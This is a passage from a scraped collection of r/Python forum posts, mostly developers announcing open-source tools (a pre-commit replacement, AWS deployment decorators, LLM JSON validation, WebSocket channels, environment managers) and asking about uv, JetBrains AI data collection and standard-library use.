üìö Docs and examples in the repo: [https://github.com/e1-m/dispytch](https://github.com/e1-m/dispytch)

Feedback, bug reports, feature requests ‚Äî all welcome.

Thanks for checking it out!"
1nkc512,prek a fast (rust and uv powered) drop in replacement for pre-commit with monorepo support!,zurtex,75,4,2025-09-18 15:56:21,https://www.reddit.com/r/Python/comments/1nkc512/prek_a_fast_rust_and_uv_powered_drop_in/,"I wanted to let you know about a tool I switched to about a month ago called prek: https://github.com/j178/prek?tab=readme-ov-file#prek

It's a drop in replacement for pre-commit, so there's no need to change any of your config files, you can install and type `prek` instead of `pre-commit`, and switch to using it for your git precommit hook by running `prek install -f`.

It has a few advantage over pre-commit:

* Core hooks re-written in Rust for better performance
* Uses uv to install Python dependencies so non-cached runs are much faster
* Can be installed without needing to set up a Python environment: https://github.com/j178/prek?tab=readme-ov-file#installation
* Monorepo support as of 0.2.0:  https://github.com/j178/prek/releases/tag/v0.2.0
* Automatic PEP 723 in-line metadata dependency installation: https://github.com/j178/prek/pull/529

It's still early days for prek, but the large project apache-airflow has adopted it (https://github.com/apache/airflow/pull/54258), is taking advantage of monorepo support (https://github.com/apache/airflow/pull/54615) and PEP 723 dependencies (https://github.com/apache/airflow/pull/54917). So it already has a lot of exposure to real world development.

When I first reviewed the tool I found a couple of bugs and they were both fixed within a few hours of reporting them. Since then I've enthusiastically adopted prek, largely because while pre-commit is stable it is very stagnant, the pre-commit author actively blocks suggesting using new packaging standards, so I am excited to see competition in this space."
1nk9v3h,Looking for feedback: Making Python Deployments Easy,openquery,8,5,2025-09-18 14:30:20,https://www.reddit.com/r/Python/comments/1nk9v3h/looking_for_feedback_making_python_deployments/,"Hey r/Python,

We've been experimenting with how to make Python deployment easier and would love your thoughts.

After building Shuttle for Rust, we're exploring whether the same patterns work well in Python.

We built [Shuttle Cobra](https://github.com/shuttle-hq/shuttle-cobra), a Python framework that lets you define AWS infrastructure using Python decorators and then using the Shuttle CLI `shuttle deploy` to deploy your code to your own AWS account.

Here's what it looks like:

    from typing import Annotated
    from shuttle_aws.s3 import AllowWrite
    
    TABLE = ""record_counts""
    
    @shuttle_task.cron(""0 * * * *"")
    async def run(
        bucket: Annotated[
            Bucket,
            BucketOptions(
                bucket_name=""grafana-exporter-1234abcd"",
                policies=[
                    AllowWrite(account_id=""842910673255"", role_name=""SessionTrackerService"")
                ]
            )
        ],
        db: Annotated[RdsPostgres, RdsPostgresOptions()],
    ):
        # ...

The goal is simplicity and ease of use, we want developers to focus on writing application code than managing infra. The CLI reads your type hints to understand what AWS resources you need, then generates CloudFormation templates automatically and deploys to your own AWS account. You will still be using the official AWS libraries so migration will be seamless by just adding a few lines of code.

Right now the framework is only focused on Python CRON jobs but planning to expand to other use cases.

We're looking for honest feedback on a few things. Does this approach feel natural in Python, or does it seem forced? How does this compare to your current deployment workflow? Is migration to this approach easy? What other AWS resources would be most useful to have supported? Do you have any concerns about mixing infrastructure definitions with application code?

This is experimental - we're trying to understand if IfC patterns that work well in Rust translate effectively to Python. The Python deployment ecosystem already has great tools, so we want to know if this adds value or just complexity.

**Resources:**

* [Full Article](https://www.shuttle.dev/blog/2025/09/18/introducing-shuttle-cobra?utm_source=reddit&utm_medium=social&utm_campaign=shuttle_cobra_launch)
* [GitHub Repository](https://github.com/shuttle-hq/shuttle-cobra)
* [Shuttle Cobra Docs](https://docs.cobra.shuttle.dev/?utm_source=reddit&utm_medium=social&utm_campaign=python_cobra_feedback)

Thanks for any feedback - positive or negative. Trying to understand if this direction makes sense for the Python community."
1nk7bet,Prompture: Get reliable JSON from LLMs with validation + usage tracking,jhd3197,0,3,2025-09-18 12:46:19,https://www.reddit.com/r/Python/comments/1nk7bet/prompture_get_reliable_json_from_llms_with/,"Hi everyone! üëã

One of the biggest headaches I had with LLMs was getting messy or inconsistent outputs when I really needed **structured JSON**.

So I built **Prompture** a Python library that makes LLMs return clean, validated JSON every time.

**What my project does:**

* Forces JSON output from LLMs (validated with `jsonschema`)
* Works with multiple drivers: OpenAI, Claude, Ollama, Azure, HTTP, mock
* Tracks tokens + costs automatically for every call
* Lets you run the same prompt across different models and compare results
* Generates reports (validation status, usage stats, execution times, etc.)

**Target audience:**

* Developers tired of parsing unreliable AI outputs
* Teams who need reproducible structured data from LLMs
* Makers who want to compare models on the same tasks

**Comparison:**

I know Ollama added structured outputs, which is great if you‚Äôre only using their models. Prompture takes the same idea but makes it universal: you‚Äôre not locked into one ecosystem, the outputs are validated against your schema, and you get cost + usage stats built in. For me it‚Äôs been a huge upgrade in terms of reliability and testing across providers.

üìÇ GitHub: [https://github.com/jhd3197/Prompture](https://github.com/jhd3197/Prompture)  
üåç PyPi: [https://pypi.org/project/prompture/](https://pypi.org/project/prompture/)

Would love feedback, suggestions, or ideas for features you'd like to see! üôå And hey‚Ä¶ don‚Äôt forget to ‚≠ê if you find it useful ‚ú®"
1nk6vma,UV issues in corporate env,jabellcu,34,151,2025-09-18 12:26:43,https://www.reddit.com/r/Python/comments/1nk6vma/uv_issues_in_corporate_env/,"I am trying uv for the first time in a corporate environment. I would like to make sure I understand correctly: 

- uv creates a virtual env in the projects folder, and it stores all dependencies in there. So, for a quick data processing job with pandas and marimo, I will keep 200Mb+ worth of library and auxiliary files. If I have different folders for different projects, this will be duplicated over on each. Maybe there is a way to set central repositories, but I already have conda for that. 

- uv automatically creates a git repository for the project. This is fine in principle, but unfortunately OneDrive, Dropbox and other sync tools choke on the .git folder. Too many files and subfolders. I have had problems in the past. 

I am not sure uv is for me. How do you guys deal with these issues? Thanks"
1nk1urz,tenets - CLI and API to aggregate context from relevant files for your prompts,PermissionNo4771,4,2,2025-09-18 07:29:49,https://www.reddit.com/r/Python/comments/1nk1urz/tenets_cli_and_api_to_aggregate_context_from/,"**What My Project Does**

I work a lot with AI pair programming tools, for implementations, code refactoring, writing tons of docs and tests, and I find they are surprisingly weak at navigating repos (the directory they have access to) when responding to and understanding what you're asking. Simply tracing the methods and imports in a relevant file or two is too limited when we have projects with hundreds of files and 100k+ LOC.

I built and launched tenets, a CLI and library to gather the right files and context automatically for your LLM prompts, living at¬†[https://tenets.dev](https://tenets.dev/), or¬†[https://github.com/jddunn/tenets](https://github.com/jddunn/tenets)¬†for the direct source. Install with one command:

`pip install tenets`

and run:

`tenets distill ""fix my bugs in the rest API authentication""`

somewhere and you'll get the most important file and their contents relevant to your prompt, optimized to fit into token budgets and summarized smartly (like imports being condensed or non-important functions truncated) as needed.

You can run the same command:

`tenets rank ""fix my bugs in the rest API authentication""`

and you'll get a list of files (at a much faster speed) on their own. Think of tenets like repomix on steroids, all automatic (no manual searches) with deterministic NLP analysis like BM25 and optional semantic understandings with embeddings.

With tenets you also get code intelligence and optional visualization tools to measure metrics, velocity, and evolution of your codebase over time, with outputs in SVG, PNG, JSON, and HTML.

**Target Audience**¬†

I built this out as a tool for personal needs that I think will have value not just for users but potential programmatic usage in coding assistants; as such, tenets has a well-documented API (https://tenets.dev/latest/api/).

**Comparison**¬†

Projects like repomix aggregate files with manual selection. I don't know of many other libraries with the same design goals and intentions as tenets."
1njzusk,What yall need? (I need a project),BravestCheetah,0,13,2025-09-18 05:26:46,https://www.reddit.com/r/Python/comments/1njzusk/what_yall_need_i_need_a_project/,"So, i just finished one of my bigger projects, a custom interpreted programming language made to feel like assembly, with memory and register emulators and an modular instruction set which is easily modifiable by just adding files to a folder, as well as a IO module system with a modular approach for Memory mapped IO. But, as cool as it sounds, there is no real usecase? (project: [https://github.com/CheetahDoesStuff/BEANS](https://github.com/CheetahDoesStuff/BEANS) (note that all docs arent fully written, i do those when im bored in school))

As im finishing up on that im looking for a project that would \*make others experience better (automod, why do you delete my post if it contains the he-lp word?)\* like libraries, cli tools, gui tools. Anything that you need or think ""why isnt there a library for that?"", ill consider. If i realise i would benefit from it too, then i would maybe consider it.. even more?

Also so nobody says it, ive already made a logging library, with log saving, custom colors, a lot of settings, project names, subnames, sublogging, error, critical, warning, info logs. Whitespace log, raw log, timestamps, misc logs, and a lot more features, check it out on pypi, its called usefullog. ( [https://pypi.org/project/usefullog](https://pypi.org/project/usefullog) )

All suggestions are welcome!"
1njvpzm,Proto-agent : an AI Agent Framework and CLI!,Opposite_Ad_974,0,2,2025-09-18 01:49:24,https://www.reddit.com/r/Python/comments/1njvpzm/protoagent_an_ai_agent_framework_and_cli/,"What my project does: I've started this project 2 weeks ago, where it started as a simple CLI, it was supposed to be just a learning educational project where others can read the code and study it to learn more about agents, but for every feature i would add, i make it really super modular and extendable that it felt to be a waste to just bind it to a single limited interface liked the command line, Porto-agent focuses heavily on independence while putting Safety as its number 1 priority through our permission system  
proton-agent's CLI isn't supposed to be some another TUI coding agent, but your own ai that can do various stuff for you on your computer through our toolkit architecture

Target audience: Both developers and normal users can benefit from using proto-agent, the former can have a very lightweight and extendable while having one of the best safety features framework to build on top of, and the CLI can be used by anyone to do various stuff, I'm adding more toolkits

Comparison: Agno framework is one of the biggest inspiration for this project, proto-agent is NOT anywhere close to have that many features but it doesn't aim to be replacement nor a competitor, I'm picking and discarding the features that my target audience actually \*needs\* for their apps rather than being an all entriprise grade framework 

  
Please give it a try either as a CLI or a framework, i would love nothing more than feedbacks, I feel like the docs are abit lacking but i'm working on it!  
[https://github.com/WeismannS/Proto-agent](https://github.com/WeismannS/Proto-agent)

If anyone wants to check it out, or contribute, please feel free to reach out."
1njtelc,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,1,1,2025-09-18 00:00:31,https://www.reddit.com/r/Python/comments/1njtelc/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1njo1k2,Where's a good place to find people to talk about projects?,InterstellarExpanse,34,10,2025-09-17 20:17:05,https://www.reddit.com/r/Python/comments/1njo1k2/wheres_a_good_place_to_find_people_to_talk_about/,"I'm a hobbyist programmer, dabbling in coding for like 20 years now, but never anything professional minus a three month stint. I'm trying to work on a medium sized Python project but honestly, I'm looking to work with someone who's a little bit more experienced so I can properly learn and ask questions instead of being reliant on a hallucinating chat bot.

But where would be the best place to discuss projects and look for like minded folks? "
1njmvk2,Is JetBrains really able to collect data from my code files through its AI service?,Effective-Koala-9956,14,13,2025-09-17 19:31:58,https://www.reddit.com/r/Python/comments/1njmvk2/is_jetbrains_really_able_to_collect_data_from_my/,"I can't tell if I'm misunderstanding this setting in PyCharm about data collection.

This is the only setting I could find that allows me to disable data collection via AI APIs, in Appearance & Behavior > System Settings > Data Sharing:

>Allow detailed data collection by JetBrains AI  
To measure and improve integration with JetBrains AI, we can collect non-anonymous information about its usage, which includes the full text of inputs sent by the IDE to the large language model and its responses, including source code snippets.  
This option enables or disables the detailed data collection by JetBrains AI in all IDEs.  
Even if this setting is disabled, the AI Assistant plugin will send the data essential for this feature to large language model providers and models hosted on JetBrains servers. If you work on a project where you don't want to share your data, you can disable the plugin.

I'm baffled by what this is saying but maybe I'm mis-reading it? It sounds like there's no way to actually prevent JetBrains from reading source files on my computer which then get processed by its AI service for the purpose of code generation/suggestions.

This feels alarming to me due to the potential for data mining and data breaches. How can anyone feel safe coding a real project with it, especially with sensitive information? It sounds like disabling it does not actually turn it off? And what is classified as ""essential"" data? Like I don't want anything in my source files shared with anyone or anything, what the hell."
1njkn7a,Fast-Channels: WebSocket + Layer Utility Port/Based on Django Channels,huygl99,6,0,2025-09-17 18:08:02,https://www.reddit.com/r/Python/comments/1njkn7a/fastchannels_websocket_layer_utility_portbased_on/,"Hi all üëã

**Sharing my new package**: **fast-channels** - Django Channels-inspired WebSocket library for FastAPI/Starlette and any ASGI framework.

## What My Project Does

Fast-channels brings Django Channels' proven consumer patterns and channel layers to FastAPI/Starlette and any ASGI framework. It enables:

- **Group messaging** - Send to multiple WebSocket connections simultaneously
- **Cross-process communication** - Message from HTTP endpoints/workers to WebSocket clients
- **Real-time notifications** without routing through database
- **Multiple backends** - In-memory, Redis Queue, Redis Pub/Sub

## Target Audience

**Production-ready** for building scalable real-time applications. Ideal for developers who:
- Need advanced WebSocket patterns beyond basic FastAPI WebSocket support
- Want Django Channels functionality without Django
- Are building chat apps, live dashboards, notifications, or collaborative tools

## Comparison

Unlike native FastAPI WebSockets (basic connection handling) or simple pub/sub libraries, fast-channels provides:
- **Consumer pattern** with structured connect/receive/disconnect methods
- **Message persistence** via Redis Queue backend
- **Automatic connection management** and group handling
- **Testing framework** for WebSocket consumers
- **Full type safety** with comprehensive type hints

## Example

```python
from fast_channels.consumer.websocket import AsyncWebsocketConsumer

class ChatConsumer(AsyncWebsocketConsumer):
    groups = [""chat_room""]
    channel_layer_alias = ""chat""

    async def connect(self):
        await self.accept()
        await self.channel_layer.group_send(
            ""chat_room"",
            {""type"": ""chat_message"", ""message"": ""Someone joined!""}
        )

    async def receive(self, text_data=None, **kwargs):
        # Broadcast to all connections in the group
        await self.channel_layer.group_send(
            ""chat_room"",
            {""type"": ""chat_message"", ""message"": f""Message: {text_data}""}
        )
```

## Links

- **PyPI**: `pip install fast-channels[redis]`
- **Docs**: https://fast-channels.readthedocs.io/
- **GitHub**: https://github.com/huynguyengl99/fast-channels
- **Tutorial**: https://fast-channels.readthedocs.io/en/latest/tutorial/index.html

Perfect for chat apps, real-time dashboards, live notifications, and collaborative tools!

Would love to hear your thoughts and feedback! üôè"
1njiy79,BS4 vs xml.etree.ElementTree,ndeans,21,17,2025-09-17 17:06:55,https://www.reddit.com/r/Python/comments/1njiy79/bs4_vs_xmletreeelementtree/,"

Beautiful Soup or standard library (xml.etree.ElementTree)? I am building an ETL process for extracting notes from Evernote ENML. I hear BS4 is easier but standard library performs faster. This alone makes me want to stick with the standard library. Any reason why I should reconsider?"
1nji3b8,user auth in azure table storage using python,the_milkman01,4,0,2025-09-17 16:35:17,https://www.reddit.com/r/Python/comments/1nji3b8/user_auth_in_azure_table_storage_using_python/,"[link to my github repo ](https://github.com/jurriaancap/auth_azuretablestorage)

  
What My Project Does

This repository provides a **lightweight user management system in Python**, built on **Azure Table Storage**. It includes:

* User registration with bcrypt password hashing
* User login with JWT-based access and refresh tokens
* Secure token refresh endpoint
* Centralized user data stored in Azure Table Storage
* Environment-based configuration (no secrets in code)

It is structured for reuse and easy inclusion in multiple projects, rather than as a one-off script.

# Target Audience

This project is primarily aimed at **developers building prototypes, proof-of-concepts, or small apps** who want:

* Centralized, persistent user authentication
* A low-cost alternative to SQL or Postgres
* A modular, easy-to-extend starting point

It is not a production-ready identity system but can be adapted and hardened for production use.

# Comparison

Unlike many authentication examples that use relational databases, this project uses **Azure Table Storage** ‚Äî making it ideal for those who want:

* A fully serverless, pay-per-use model
* A simple NoSQL-style approach to user management
* Easy integration with other Azure services

If you want a simple, minimal, and cloud-native way to handle user authentication without spinning up a SQL database,"
1njhu32,Good platform to deploy python scripts with triggers & scheduling,CesMry_BotBlogR,3,35,2025-09-17 16:25:52,https://www.reddit.com/r/Python/comments/1njhu32/good_platform_to_deploy_python_scripts_with/,"Hey folks,

I'm a full-stack dev and recently played around with no-code tools like Make/Zapier for a side project.

What I really liked was how fast it is to set up automations with triggers (RSS, webhooks, schedules, etc.), basically cron jobs without the hassle.

But as a developer, I find it a bit frustrating that all these tools are so geared towards non-coders.

Sometimes I‚Äôd rather just drop a small Python or JS file, wire up a trigger/cron, and have it run in autopilot (I already think about many scrapers I would have loved to deploy ages ago) ‚Äî without messing with full infra like AWS Lambda, Render, or old-school stuff like PythonAnywhere.

So my question is:

***üëâ Do some of you know a modern, dev-friendly platform that‚Äôs specifically built for running small scripts with scheduling and event triggers?***

Something between ‚ÄúZapier for non-coders‚Äù and ‚Äúfull serverless setup with IAM roles and Docker images‚Äù.

I‚Äôve seen posts like [this one](https://www.reddit.com/r/learnpython/comments/12t9bgm/how_do_i_deploy_python_scripts_in_production/) but didn‚Äôt find a really clean solution for managing multiple little projects/scripts.

Would love to hear if anyone here has found a good workflow or platform for that!"
1njb946,Built a small PyPI Package for explainable preprocessing,western_chicha,3,1,2025-09-17 12:04:27,https://www.reddit.com/r/Python/comments/1njb946/built_a_small_pypi_package_for_explainable/,"I made a Python package that explains preprocessing with reports and plots

Note: This project started as a way for me to learn packaging and publishing on PyPI, but I thought it might also be useful for beginners who want not just preprocessing, but also clear reports and plots of what happened during preprocessing.


What my project does: It‚Äôs a simple ML preprocessing helper package called ml-explain-preprocess. Along with handling basic preprocessing tasks (missing values, encoding, scaling, and outliers), it also generates additional outputs to make the process more transparent:

Text reports

JSON reports

(Optional) visual plots of distributions and outliers


The idea was to make it easier for beginners not only to preprocess data but also to understand what happened during preprocessing, since I couldn‚Äôt find many libraries that provide clear reports or visualizations alongside transformations.

It‚Äôs nothing advanced and definitely not optimized for production-level pipelines, but it was a good exercise in learning how packaging works and how to publish to PyPI.

Target audience: beginners in ML who want preprocessing plus some transparency. Experts probably won‚Äôt find it very useful, but maybe it can help people starting out.

Comparison: To my knowledge, most existing libraries handle preprocessing well, but they don‚Äôt directly give reports/plots. This project tries to cover that small gap.

If anyone wants to check it out or contribute, please feel free:

PyPI: https://pypi.org/project/ml-explain-preprocess/
GitHub: https://github.com/risheeee/ml-explain-preprocess.git

Would appreciate any feedback, especially on how to improve packaging or add meaningful features."
1nj8l0y,Master Roshi AI Chatbot - Train with the Turtle Hermit,No-Base-1700,0,0,2025-09-17 09:38:55,https://www.reddit.com/r/Python/comments/1nj8l0y/master_roshi_ai_chatbot_train_with_the_turtle/,"URL: https://roshi-ai-showcase.vercel.app

Hey Guys, I created a chatbot using Nomos (https://nomos.dowhile.dev) (https://github.com/dowhiledev/nomos) which allows you to create AI Intelligent AI Agents without writing code (but if you want to you can do that too). Give it a try. (Responding speed could be slow as i am using a free tier service). AI Agent have access to https://dragonball-api.com

Give it a try. Tell me how i can improve the library and what to create next with it

Frontend is made with lovable"
1nj7y99,Python's role in the AI infrastructure stack ‚Äì sharing lessons from building production AI systems,Siddharth-1001,0,4,2025-09-17 08:58:27,https://www.reddit.com/r/Python/comments/1nj7y99/pythons_role_in_the_ai_infrastructure_stack/,"Python's dominance in AI/ML is undeniable, but after building several production AI systems, I've learned that the language choice is just the beginning. The real challenges are in architecture, deployment, and scaling.

**Current project:**¬†Multi-agent system processing 100k+ documents daily  
**Stack:**¬†FastAPI, Celery, Redis, PostgreSQL, Docker  
**Scale:**¬†\~50 concurrent AI workflows, 1M+ API calls/month

**What's working well:**

* **FastAPI for API development**¬†‚Äì async support handles concurrent AI calls beautifully
* **Celery for background processing**¬†‚Äì essential for long-running AI tasks
* **Pydantic for data validation**¬†‚Äì catches errors before they hit expensive AI models
* **Rich ecosystem**¬†‚Äì libraries like LangChain, Transformers, and OpenAI client make development fast

**Pain points I've encountered:**

* **Memory management**¬†‚Äì AI models are memory-hungry, garbage collection becomes critical
* **Dependency hell**¬†‚Äì AI libraries have complex requirements that conflict frequently
* **Performance bottlenecks**¬†‚Äì Python's GIL becomes apparent under heavy concurrent loads
* **Deployment complexity**¬†‚Äì managing GPU dependencies and model weights in containers

**Architecture decisions that paid off:**

1. **Async everywhere**¬†‚Äì using asyncio for all I/O operations, including AI model calls
2. **Worker pools**¬†‚Äì separate processes for different AI tasks to isolate failures
3. **Caching layer**¬†‚Äì Redis for expensive AI results, dramatically improved response times
4. **Health checks**¬†‚Äì monitoring AI model availability and fallback mechanisms

**Code patterns that emerged:**

`# Context manager for AI model lifecycle`

`@asynccontextmanager`

`async def ai_model_context(model_name: str):`

`model = await load_model(model_name)`

`try:`

`yield model`

`finally:`

`await cleanup_model(model)`



`# Retry logic for AI API calls`

`@retry(stop=stop_after_attempt(3), wait=wait_exponential())`

`async def call_ai_api(prompt: str) -> str:`

`# Implementation with proper error handling`

**Questions for the community:**

1. How are you handling AI model deployment and versioning in production?
2. What's your experience with alternatives to Celery for AI workloads?
3. Any success stories with Python performance optimization for AI systems?
4. How do you manage the costs of AI API calls in high-throughput applications?

**Emerging trends I'm watching:**

* **MCP (Model Context Protocol)**¬†‚Äì standardizing how AI systems interact with external tools
* **Local model deployment**¬†‚Äì running models like Llama locally for cost/privacy
* **AI observability tools**¬†‚Äì monitoring and debugging AI system behavior
* **Edge AI with Python**¬†‚Äì running lightweight models on edge devices

The Python AI ecosystem is evolving rapidly. Curious to hear what patterns and tools are working for others in production environments."
1nj7agh,Datalore vs Deepnote?,Odd-Avocado7191,0,1,2025-09-17 08:14:29,https://www.reddit.com/r/Python/comments/1nj7agh/datalore_vs_deepnote/,I have been a long-term user of Deepnote at my previous company and am now looking for alternatives for my current company. Can anyone vouch for Datalore? 
1nj12yr,Do you prefer sticking to the standard library or pulling in external packages?,Unusual-Program-2166,107,109,2025-09-17 02:23:09,https://www.reddit.com/r/Python/comments/1nj12yr/do_you_prefer_sticking_to_the_standard_library_or/,"I‚Äôve been writing Python for a while and I keep running into this situation. Python‚Äôs standard library is huge and covers so much, but sometimes it feels easier (or just faster) to grab a popular external package from PyPI.

For example, I‚Äôve seen people write entire data processing scripts with just built-in modules, while others immediately bring in pandas or requests even for simple tasks.

I‚Äôm curious how you all approach this. Do you try to keep dependencies minimal and stick to the stdlib as much as possible, or do you reach for external packages early to save development time?"
1nj0bd4,Can i use candyserver together with gunicorn?,tranylvu,0,3,2025-09-17 01:46:49,https://www.reddit.com/r/Python/comments/1nj0bd4/can_i_use_candyserver_together_with_gunicorn/,"Hi,

I have a flask web service that originally run with gunicorn and nginx on top of it. and I would like to replace with cadyserver.

Can i set up my flask server with gunicorn and cadyserver? or can cadyserver replace both gunicorn and nginx"
1nixhum,I've created an cross platform app called `PyEnvManager` to make managing python virtual envs easy,TypicalPudding6190,0,10,2025-09-16 23:37:26,https://www.reddit.com/r/Python/comments/1nixhum/ive_created_an_cross_platform_app_called/,"Hey folks,

I just released a small tool¬†called¬†**PyEnvManager**. Would love to showcase it and  get feedback from the community .

# Problem

This all started while I was working on another project that needed a bunch of different Python environments. Different dependencies, different Python versions, little experiments I didn‚Äôt want to contaminate ‚Äî so I kept making new envs. 

At the time it felt like I was being organized. I assumed I had maybe 5‚Äì6 environments active. When I finally checked, I had 6 actively used Python virtual environments, but there were also many leftover envs scattered across Conda, venv, Poetry, and Mamba ‚Äî together they were chewing up \~45GB on my Windows machine. On my Mac, where I thought things were ‚Äúclean,‚Äù I found another 4 using \~5GB. And honestly, it was just annoying. I couldn‚Äôt remember which ones were safe to delete, which belonged to what project, or why some even existed. Half the time with Jupyter I‚Äôd open a notebook, it would throw a¬†*ModuleNotFoundError: No module named 'pandas*', and then I‚Äôd realize I launched it in the wrong kernel. It wasn‚Äôt catastrophic, but it was really annoying ‚Äî a steady drip of wasted time that broke my flow.

So, i built this to improve my workflow.

Github:¬†[https://github.com/Pyenvmanager](https://github.com/Pyenvmanager) 

Website:¬†[https://pyenvmanager.com/](https://pyenvmanager.com/)

# What My Project Does

PyEnvManager is a small desktop app that helps you¬†**discover, manage, and secure Python virtual environments**¬†across a machine . It‚Äôs focused on removing the everyday friction of working with many envs and making environment-related security and compliance easy to see.

Core capabilities (today / near-term):

* System-wide environment discovery across different environments (Conda, venv, Poetry, Mamba, Micromamba).
* Per-env metadata: Python version, disk usage, last-used timestamp.
* One-click Jupyter launch into the correct environment
* Create envs from templates or with custom packages.
* Safe delete with a preview of reclaimed disk space.
* Dependency surface: searchable package chips and CVE highlighting (dependency scanning aligned with pip-audit behavior).
* Exportable metadata / SBOM (planned/improving for Teams/Enterprise). 

Short form: it finds the envs you forgot about, helps you use the right one, and gives you the tools to clean and audit them.

# Target Audience

**Who it‚Äôs for, and how it should be used**

* **Individual developers & data scientists (primary, production-ready):**
   * Daily local use on laptops and workstations.
   * If you want to stop wasting time managing kernels, reclaim disk space, and avoid ‚Äúwrong-kernel‚Äù bugs, this is for you.
* **Small teams / consultancies (early pilots / beta):**
   * Useful for reproducibility, shared templates, and exporting SBOMs for client work.
   * Good candidate for a pilot with a few machines to validate workflows and reporting needs.¬†
   * The product is¬†**production-ready for individual devs**¬†(discovery, Jupyter launch, deletes, templates).
* Team & enterprise functionality is being added progressively (SBOM exports, snapshots, headless CLI).

# Comparison

* **vs**¬†`pyenv`¬†**/**¬†`conda`¬†**/**¬†`poetry`¬†**(CLI tools):**
   * Those are excellent for version switching and per-project env creation. They do¬†**not**¬†provide system-wide discovery, a unified GUI, disk-usage visibility, or one-click Jupyter kernel mapping. PyEnvManager sits on top of those workflows and gives a single place to see and act on all envs.
* **vs**¬†`pip-audit`¬†**/ SCA tools (Snyk, OSV, etc.):**
   * SCA tools focus on dependency scanning of projects and CI pipelines. PyEnvManager focuses on¬†**installed environments on machines**¬†(local dev workstations), surfacing envs that SCA tools typically never see. It aligns with pip-audit for CVE detection but is not meant to replace enterprise SCA in CI/CD ‚Äî it complements them by finding the hidden surface area on endpoints.
* **vs developer GUIs (IDE plugins, Docker Desktop):**
   * Docker Desktop is a platform for containers and developer workflows. PyEnvManager is specifically about¬†**Python virtual environments**, Jupyter workflows, and reproducibility. The ‚ÄúDocker Desktop for Python envs‚Äù analogy helps convey the UX-level ambition: make env discovery and management approachable and visual."
1nitzoz,List of 87 Programming Ideas for Beginners (with Python implementations),AlSweigart,216,29,2025-09-16 21:13:35,https://www.reddit.com/r/Python/comments/1nitzoz/list_of_87_programming_ideas_for_beginners_with/,"https://inventwithpython.com/blog/programming-ideas-beginners-big-book-python.html

I've compiled a list of beginner-friendly programming projects, with example implementations in Python. These projects are drawn from my free Python books, but since they only use stdio text, you can implement them in any language.

I got tired of the copy-paste ""1001 project"" posts that obviously were copied from other posts or generated by AI which included everything from ""make a coin flip program"" to ""make an operating system"". I've personally curated this list to be small enough for beginners. The implementations are all usually under 100 or 200 lines of code."
1nirump,An open source internal tools platform for Python programs,Competitive-Water302,13,10,2025-09-16 19:52:32,https://www.reddit.com/r/Python/comments/1nirump/an_open_source_internal_tools_platform_for_python/,"Like the title says I am building an open source internal tools platform for Python programs, specifically one that is aimed at giving a company or team access to internal Python apps through a centralized hub. I have been building internal tools for 4 years and have used just about every software and platform out there:

(Heroku, Streamlit Cloud, Hugging Face Spaces, Retool, Fly.io / Render / Railway),

and they all fall short in terms of simplicity and usability for most teams. This platform would allow smaller dev teams to click-to-deploy small-medium sized programs, scripts, web apps, etc. to the cloud from a Github repository. The frontend will consist of a portal to select the program you want to run and then route to that specific page to execute it. Features I am looking into are:

* centralized sharing gives non-tech users an easier way to access all the tools in one location (no more siloed notebooks, scripts, and web app URLs)
* one-click edits/deploys (git push = updated application in cloud)
* execution logs + observability at the user level -> dev(s) can see the exact error logs + I/Os 
* secure SSO (integration with both azure and gcp)
* usage analytics

I'm wondering if this would be useful for others / what features you would like to see in it! Open to all feedback and advice. Lmk if you are interested in collaborating as well, I want this to be a community-first project."
1nirju1,Any python meetups/talks in the NY/NJ area coming up? What do you use to find events like this?,luunnn,1,1,2025-09-16 19:41:17,https://www.reddit.com/r/Python/comments/1nirju1/any_python_meetupstalks_in_the_nynj_area_coming/,Interested in attending anything python related except for data science. It would be nice to be around and hear people talk about and see how they use python in a professional setting. 
1niqudg,Let your Python agents play an MMO: Agent-to-Agent protocol + SDK,SummonerNetwork,21,1,2025-09-16 19:15:17,https://www.reddit.com/r/Python/comments/1niqudg/let_your_python_agents_play_an_mmo_agenttoagent/,"

**Repo:** [https://github.com/Summoner-Network/summoner-agents](https://github.com/Summoner-Network/summoner-agents)

**TL;DR:** We are building **Summoner**, a Python SDK with a Rust server for agent-to-agent networking across machines. Early beta (beta version 1.0).

**What my project does:** A protocol for live agent interaction with a desktop app to track network-wide agent state (battles, collaborations, reputation), so you can build MMO-style games, simulations, and tools.

**Target audience:** Students, indie devs, and small teams who want to build networked multi-agent projects, simulations, or MMO-style experiments in Python.

**Comparison:**

* LangChain and CrewAI are app frameworks and an API spec for serving agents, not an on-the-wire interop protocol;
* Google A2A is an HTTP-based spec that uses JSON-RPC by default (with optional gRPC or REST);
* MCP standardizes model-to-tool and data connections.
* **Summoner** targets live, persistent agent-to-agent networking for MMO-style coordination.

**Status**

Our Beta 1.0. works with example agents today. Expect sharp edges.

**More**

Github page: [https://github.com/Summoner-Network](https://github.com/Summoner-Network)

Docs/design notes: [https://github.com/Summoner-Network/summoner-docs](https://github.com/Summoner-Network/summoner-docs)

Core runtime: [https://github.com/Summoner-Network/summoner-core](https://github.com/Summoner-Network/summoner-core)

Site: [https://summoner.org](https://summoner.org)"
1niqqg2,Anyone willing to collaborate on a new chess bot called Ou7 (already has a Github page),EOSTRAT,0,12,2025-09-16 19:11:15,https://www.reddit.com/r/Python/comments/1niqqg2/anyone_willing_to_collaborate_on_a_new_chess_bot/,"I am looking for 1-3 people to help develop a new chess bot coded entirely in python (Ou7) if this sounds like it might interest you, message me"
